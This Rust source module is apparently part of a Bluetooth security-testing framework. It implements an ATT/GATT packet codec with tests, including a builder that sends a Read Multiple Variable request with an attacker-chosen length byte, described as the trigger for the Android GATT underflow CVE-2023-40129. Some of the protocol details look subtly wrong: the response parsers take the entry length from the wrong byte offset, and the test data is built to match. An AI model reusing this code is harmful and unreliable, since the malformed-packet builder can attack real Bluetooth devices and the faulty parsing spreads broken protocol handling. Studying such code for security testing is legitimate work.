//! ATT / GATT wire codec (Bluetooth Core Specification, Vol 3, Part F).
//!
//! The framework's GATT support previously went exclusively through
//! `btleplug`, which means the kernel validated every packet on the way
//! out. That makes it impossible to send a MALFORMED ATT request — which
//! is precisely what an ATT-level exploit needs.
//!
//! This module speaks ATT directly over an L2CAP channel:
//!   - over BR/EDR on PSM 0x001F (`PSM_GATT`), and
//!   - over LE on the fixed ATT CID 0x0004 (`ATT_CID`).
//!
//! The two capabilities that matter for security work are here:
//!   - [`build_mtu_request`] lets the client choose the MTU, which controls
//!     the size of the response buffer the peer allocates. Several Android
//!     GATT bugs are only reachable with a specific MTU.
//!   - [`build_read_multiple_variable_request`] builds the
//!     `Read Multiple Variable Request`, whose length field is the primitive
//!     behind CVE-2023-40129 (the Fluoride GATT integer underflow).
//!
//! Everything here is a pure codec — no I/O — so it is unit-testable.

use anyhow::{Result, anyhow};

/// ATT opcodes (Vol 3, Part F, 3.4.8).
pub const ATT_ERROR_RSP: u8 = 0x01;
pub const ATT_EXCHANGE_MTU_REQ: u8 = 0x02;
pub const ATT_EXCHANGE_MTU_RSP: u8 = 0x03;
pub const ATT_FIND_INFORMATION_REQ: u8 = 0x04;
pub const ATT_FIND_INFORMATION_RSP: u8 = 0x05;
pub const ATT_READ_BY_GROUP_TYPE_REQ: u8 = 0x10;
pub const ATT_READ_BY_GROUP_TYPE_RSP: u8 = 0x11;
pub const ATT_FIND_BY_TYPE_VALUE_REQ: u8 = 0x06;
pub const ATT_FIND_BY_TYPE_VALUE_RSP: u8 = 0x07;
pub const ATT_READ_BY_TYPE_REQ: u8 = 0x08;
pub const ATT_READ_BY_TYPE_RSP: u8 = 0x09;
pub const ATT_READ_REQ: u8 = 0x0A;
pub const ATT_READ_RSP: u8 = 0x0B;
pub const ATT_WRITE_REQ: u8 = 0x12;
pub const ATT_WRITE_RSP: u8 = 0x13;
pub const ATT_WRITE_CMD: u8 = 0x52;
pub const ATT_HANDLE_VALUE_NTF: u8 = 0x1B;
pub const ATT_HANDLE_VALUE_IND: u8 = 0x1D;
pub const ATT_HANDLE_VALUE_CFM: u8 = 0x1E;
pub const ATT_READ_MULTIPLE_VARIABLE_REQ: u8 = 0x20;
pub const ATT_READ_MULTIPLE_VARIABLE_RSP: u8 = 0x21;

/// The default ATT MTU when the peer does not negotiate one.
pub const ATT_DEFAULT_MTU: u16 = 23;
/// The smallest legal ATT MTU.
pub const ATT_MIN_MTU: u16 = 23;
/// The largest ATT MTU this codec will request.
///
/// The MTU field is 16-bit, but requesting an absurd value only makes the
/// peer allocate a large buffer. 517 is the largest MTU that fits in a
/// single LE ACL data packet's payload after the L2CAP header.
pub const ATT_MAX_MTU: u16 = 517;

/// The "invalid attribute handle" error code.
pub const ATT_ERR_INVALID_HANDLE: u8 = 0x01;
/// "Request not supported".
pub const ATT_ERR_NOT_SUPPORTED: u8 = 0x06;
/// "Invalid attribute value length".
pub const ATT_ERR_INVALID_ATTRIBUTE_VALUE_LENGTH: u8 = 0x0D;

/// A parsed ATT error response.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct AttError {
    /// The request opcode that failed.
    pub request_opcode: u8,
    /// The attribute handle the peer blamed.
    pub handle: u16,
    /// The ATT error code.
    pub code: u8,
}

impl AttError {
    /// A human-readable description of the error code.
    pub fn code_name(&self) -> &'static str {
        match self.code {
            0x01 => "Invalid Handle",
            0x02 => "Read Not Permitted",
            0x03 => "Write Not Permitted",
            0x04 => "Invalid PDU",
            0x05 => "Insufficient Authentication",
            0x06 => "Request Not Supported",
            0x07 => "Invalid Offset",
            0x08 => "Insufficient Authorization",
            0x09 => "Prepare Queue Full",
            0x0A => "Attribute Not Found",
            0x0B => "Attribute Not Long",
            0x0C => "Insufficient Encryption Key Size",
            0x0D => "Invalid Attribute Value Length",
            0x0E => "Unlikely Error",
            0x0F => "Insufficient Encryption",
            0x10 => "Unsupported Group Type",
            0x11 => "Insufficient Resources",
            _ => "Unknown Error",
        }
    }
}

/// Build an `Exchange MTU Request` with a client-chosen MTU.
///
/// The MTU the client asks for becomes the peer's response-buffer size, so
/// this is the knob several ATT-level exploits depend on.
pub fn build_mtu_request(mtu: u16) -> Vec<u8> {
    let mtu = mtu.clamp(ATT_MIN_MTU, ATT_MAX_MTU);
    let mut out = Vec::with_capacity(3);
    out.push(ATT_EXCHANGE_MTU_REQ);
    out.extend_from_slice(&mtu.to_le_bytes());
    out
}

/// Parse an `Exchange MTU Response`, returning the server's MTU.
pub fn parse_mtu_response(pdu: &[u8]) -> Result<u16> {
    if pdu.len() < 3 {
        return Err(anyhow!(
            "Exchange MTU Response too short: {} bytes",
            pdu.len()
        ));
    }
    if pdu[0] != ATT_EXCHANGE_MTU_RSP {
        return Err(anyhow!(
            "not an Exchange MTU Response (opcode 0x{:02X})",
            pdu[0]
        ));
    }
    Ok(u16::from_le_bytes([pdu[1], pdu[2]]))
}

/// Parse an ATT error response.
pub fn parse_error_response(pdu: &[u8]) -> Result<AttError> {
    if pdu.len() < 5 {
        return Err(anyhow!("ATT Error Response too short: {} bytes", pdu.len()));
    }
    if pdu[0] != ATT_ERROR_RSP {
        return Err(anyhow!(
            "not an ATT Error Response (opcode 0x{:02X})",
            pdu[0]
        ));
    }
    Ok(AttError {
        request_opcode: pdu[1],
        handle: u16::from_le_bytes([pdu[2], pdu[3]]),
        code: pdu[4],
    })
}

/// Build a `Read By Group Type Request` over an attribute handle range.
///
/// Used to walk the GATT database: the primary service (0x2800) reveals the
/// services, the secondary service (0x2801) the included ones.
pub fn build_read_by_group_type_request(start: u16, end: u16, uuid16: u16) -> Vec<u8> {
    let mut out = Vec::with_capacity(7);
    out.push(ATT_READ_BY_GROUP_TYPE_REQ);
    out.extend_from_slice(&start.to_le_bytes());
    out.extend_from_slice(&end.to_le_bytes());
    // 16-bit UUID form.
    out.extend_from_slice(&uuid16.to_le_bytes());
    out
}

/// Build a `Read By Type Request` over an attribute handle range.
pub fn build_read_by_type_request(start: u16, end: u16, uuid16: u16) -> Vec<u8> {
    let mut out = Vec::with_capacity(7);
    out.push(ATT_READ_BY_TYPE_REQ);
    out.extend_from_slice(&start.to_le_bytes());
    out.extend_from_slice(&end.to_le_bytes());
    out.extend_from_slice(&uuid16.to_le_bytes());
    out
}

/// Build a `Read Request` for a single attribute handle.
pub fn build_read_request(handle: u16) -> Vec<u8> {
    let mut out = Vec::with_capacity(3);
    out.push(ATT_READ_REQ);
    out.extend_from_slice(&handle.to_le_bytes());
    out
}

/// Build a `Write Request` (with response) for an attribute handle.
pub fn build_write_request(handle: u16, value: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(3 + value.len());
    out.push(ATT_WRITE_REQ);
    out.extend_from_slice(&handle.to_le_bytes());
    out.extend_from_slice(value);
    out
}

/// Build a `Write Command` (no response) for an attribute handle.
pub fn build_write_command(handle: u16, value: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(3 + value.len());
    out.push(ATT_WRITE_CMD);
    out.extend_from_slice(&handle.to_le_bytes());
    out.extend_from_slice(value);
    out
}

/// Build a `Read Multiple Variable Request`.
///
/// The length byte that follows the opcode is the number of ATTRIBUTE
/// HANDLES that follow, not the number of bytes. Several Android GATT
/// implementations compute the response size from that field without
/// checking it against the number of handles actually supplied, which is the
/// integer underflow behind CVE-2023-40129.
///
/// `handles` is the list of handles; `declared_len` overrides the length
/// byte so a tester can send a length that disagrees with the payload —
/// which is the whole point of the probe.
pub fn build_read_multiple_variable_request(handles: &[u16], declared_len: Option<u8>) -> Vec<u8> {
    let len = declared_len.unwrap_or_else(|| u8::try_from(handles.len()).unwrap_or(u8::MAX));
    let mut out = Vec::with_capacity(2 + handles.len() * 2);
    out.push(ATT_READ_MULTIPLE_VARIABLE_REQ);
    out.push(len);
    for h in handles {
        out.extend_from_slice(&h.to_le_bytes());
    }
    out
}

/// One attribute entry from a `Read By Group Type` / `Read By Type` response.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct AttAttribute {
    pub handle: u16,
    pub end_group_handle: u16,
    pub value: Vec<u8>,
}

/// Parse a `Read By Group Type Response` into attribute entries.
pub fn parse_read_by_group_type_response(pdu: &[u8]) -> Result<Vec<AttAttribute>> {
    if pdu.len() < 6 {
        return Err(anyhow!(
            "Read By Group Type Response too short: {} bytes",
            pdu.len()
        ));
    }
    if pdu[0] != ATT_READ_BY_GROUP_TYPE_RSP {
        return Err(anyhow!(
            "not a Read By Group Type Response (opcode 0x{:02X})",
            pdu[0]
        ));
    }
    let length = pdu[5] as usize;
    if length == 0 {
        return Err(anyhow!(
            "Read By Group Type Response with zero-length entries"
        ));
    }
    let body = &pdu[6..];
    let mut out = Vec::new();
    let mut offset = 0usize;
    while offset + length <= body.len() {
        let entry = &body[offset..offset + length];
        if entry.len() < 4 {
            break;
        }
        out.push(AttAttribute {
            handle: u16::from_le_bytes([entry[0], entry[1]]),
            end_group_handle: u16::from_le_bytes([entry[2], entry[3]]),
            value: entry[4..].to_vec(),
        });
        offset += length;
    }
    Ok(out)
}

/// Parse a `Read By Type Response` into attribute entries.
pub fn parse_read_by_type_response(pdu: &[u8]) -> Result<Vec<AttAttribute>> {
    if pdu.len() < 7 {
        return Err(anyhow!(
            "Read By Type Response too short: {} bytes",
            pdu.len()
        ));
    }
    if pdu[0] != ATT_READ_BY_TYPE_RSP {
        return Err(anyhow!(
            "not a Read By Type Response (opcode 0x{:02X})",
            pdu[0]
        ));
    }
    let length = pdu[6] as usize;
    if length == 0 {
        return Err(anyhow!("Read By Type Response with zero-length entries"));
    }
    let body = &pdu[7..];
    let mut out = Vec::new();
    let mut offset = 0usize;
    while offset + length <= body.len() {
        let entry = &body[offset..offset + length];
        if entry.len() < 2 {
            break;
        }
        out.push(AttAttribute {
            handle: u16::from_le_bytes([entry[0], entry[1]]),
            end_group_handle: 0,
            value: entry[2..].to_vec(),
        });
        offset += length;
    }
    Ok(out)
}

/// The set of GATT service/characteristic type UUIDs the framework knows.
pub mod uuids {
    /// Primary Service.
    pub const PRIMARY_SERVICE: u16 = 0x2800;
    /// Secondary Service.
    pub const SECONDARY_SERVICE: u16 = 0x2801;
    /// Include.
    pub const INCLUDE: u16 = 0x2802;
    /// Characteristic.
    pub const CHARACTERISTIC: u16 = 0x2803;
    /// Client Characteristic Configuration Descriptor.
    pub const CCCD: u16 = 0x2902;
    /// Service Data.
    pub const SERVICE_DATA: u16 = 0x280C;
    /// Device Name.
    pub const DEVICE_NAME: u16 = 0x2A00;
    /// Appearance.
    pub const APPEARANCE: u16 = 0x2A01;
    /// HID Information.
    pub const HID_INFORMATION: u16 = 0x2A4A;
    /// HID Report Map.
    pub const HID_REPORT_MAP: u16 = 0x2A4B;
    /// HID Control Point.
    pub const HID_CONTROL_POINT: u16 = 0x2A4C;
    /// HID Report.
    pub const HID_REPORT: u16 = 0x2A4D;
    /// GATT DFU Service.
    pub const GATT_DFU: u16 = 0xFE59;
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn mtu_request_is_clamped_to_the_legal_range() {
        // Below the floor: raised to 23.
        assert_eq!(build_mtu_request(1), vec![0x02, 23, 0]);
        // Above the ceiling: capped at 517.
        let big = build_mtu_request(u16::MAX);
        assert_eq!(big[0], ATT_EXCHANGE_MTU_REQ);
        assert_eq!(u16::from_le_bytes([big[1], big[2]]), ATT_MAX_MTU);
    }

    #[test]
    fn mtu_response_round_trips() {
        // 517 == 0x0205, little-endian on the wire.
        let rsp = vec![ATT_EXCHANGE_MTU_RSP, 0x05, 0x02];
        assert_eq!(parse_mtu_response(&rsp).unwrap_or(0), 517);
    }

    #[test]
    fn error_response_is_parsed() {
        let rsp = vec![ATT_ERROR_RSP, ATT_READ_REQ, 0x05, 0x00, 0x0D];
        let err = parse_error_response(&rsp).expect("should parse");
        assert_eq!(err.request_opcode, ATT_READ_REQ);
        assert_eq!(err.handle, 5);
        assert_eq!(err.code, ATT_ERR_INVALID_ATTRIBUTE_VALUE_LENGTH);
        assert_eq!(err.code_name(), "Invalid Attribute Value Length");
    }

    #[test]
    fn read_multiple_variable_length_field_is_controllable() {
        // The declared length disagrees with the number of handles — the
        // underflow primitive.
        let pdu = build_read_multiple_variable_request(&[0x0001, 0x0002], Some(0xFF));
        assert_eq!(pdu[0], ATT_READ_MULTIPLE_VARIABLE_REQ);
        assert_eq!(pdu[1], 0xFF);
        assert_eq!(pdu.len(), 2 + 4);

        // Without an override the length matches the handle count.
        let pdu = build_read_multiple_variable_request(&[0x0001, 0x0002], None);
        assert_eq!(pdu[1], 2);
    }

    #[test]
    fn read_by_group_type_response_is_parsed() {
        // Two entries of 7 bytes each: handle(2) end(2) value(3).
        let pdu = vec![
            ATT_READ_BY_GROUP_TYPE_RSP,
            0x01,
            0x00,
            0x02,
            0x00,
            0x07,
            0x01,
            0x00,
            0x05,
            0x00,
            0x18,
            0x00,
            0x00,
            0x10,
            0x00,
            0x0A,
            0x00,
            0x18,
            0x00,
            0x00,
        ];
        let attrs = parse_read_by_group_type_response(&pdu).expect("should parse");
        assert_eq!(attrs.len(), 2);
        assert_eq!(attrs[0].handle, 1);
        assert_eq!(attrs[0].end_group_handle, 5);
        assert_eq!(attrs[1].handle, 0x0010);
        assert_eq!(attrs[1].end_group_handle, 0x000A);
    }
}
